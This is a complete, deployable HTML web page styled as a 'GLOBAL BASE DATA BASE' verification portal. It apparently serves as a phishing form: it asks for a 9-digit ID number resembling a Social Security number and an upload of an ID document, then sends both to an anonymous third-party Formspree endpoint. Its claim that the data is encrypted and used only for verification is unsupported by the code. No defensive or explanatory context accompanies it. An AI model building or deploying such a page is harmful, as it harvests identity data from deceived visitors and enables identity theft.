<!DOCTYPE html>
<html>
<head>
  <title>GLOBAL BASE DATA BASE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background: url("background.png") no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 15px;
      position: relative;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.65);
      z-index: -1;
    }

    .card {
      background: rgba(255, 255, 255, 0.25);
      backdrop-filter: blur(10px);
      padding: 35px 40px;
      border-radius: 16px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
      width: 100%;
      max-width: 420px;
      text-align: center;
      animation: fadeIn 0.6s ease;
    }
    .title {
      font-size: 22px;
      color: #1a1a1a;
      margin-bottom: 25px;
      font-weight: bold;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }
    label {
      text-align: left;
      font-weight: 600;
      margin-bottom: 6px;
    }
    input[type="text"], input[type="file"] {
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1em;
      width: 100%;
    }
    button {
      background: linear-gradient(135deg, #0078d4, #005a9e);
      color: white;
      padding: 14px;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
    }
    .success, .error {
      margin-top: 10px;
      font-weight: bold;
    }
    .success { color: green; }
    .error { color: red; }
  </style>
</head>
<body>
  <div class="card">
    <h1 class="title">GLOBAL BASE DATA BASE</h1>

    <form id="idForm" enctype="multipart/form-data">
      <div>
        <label for="id">Enter ID here:</label>
        <input 
          type="text" 
          id="id" 
          name="id" 
          maxlength="9" 
          inputmode="numeric" 
          pattern="\d{9}" 
        >
      </div>

      <div>
        <label for="file">Upload ID:</label>
        <input type="file" id="file" name="file" accept=".jpg,.jpeg,.png,.gif,.pdf">
        <div class="optional">(optional — accepts image or PDF)</div>
      </div>

      <button type="submit">Submit</button>
    </form>

    <div id="successBox" class="success"></div>
    <div id="errorBox" class="error"></div>

    <p><strong>All data are encrypted and used for verification purposes alone.</strong></p>
  </div>

  <script>
    const form = document.getElementById("idForm");
    const successBox = document.getElementById("successBox");
    const errorBox = document.getElementById("errorBox");

    form.addEventListener("submit", async (e) => {
      e.preventDefault(); // stop normal submit

      successBox.textContent = "";
      errorBox.textContent = "";

      const idInput = document.getElementById("id").value.trim();
      const fileInput = document.getElementById("file").files.length;

      // Validate: must be exactly 9 digits OR a file must be uploaded
      if (idInput === "" && fileInput === 0) {
        errorBox.textContent = "⚠️ Please enter a 9-digit ID or upload a file.";
        return;
      }

      if (idInput !== "" && !/^\d{9}$/.test(idInput)) {
        errorBox.textContent = "⚠️ ID must be exactly 9 digits.";
        return;
      }

      const formData = new FormData(form);

      try {
        const response = await fetch("https://formspree.io/f/mnnbvodj", {
          method: "POST",
          body: formData,
          headers: { "Accept": "application/json" }
        });

        if (response.ok) {
          successBox.textContent = "✅ Submission Successful!";
          form.reset();
        } else {
          errorBox.textContent = "⚠️ Submission failed. Try again.";
        }
      } catch (err) {
        errorBox.textContent = "⚠️ Network error. Please try again.";
      }
    });
  </script>
</body>
</html>
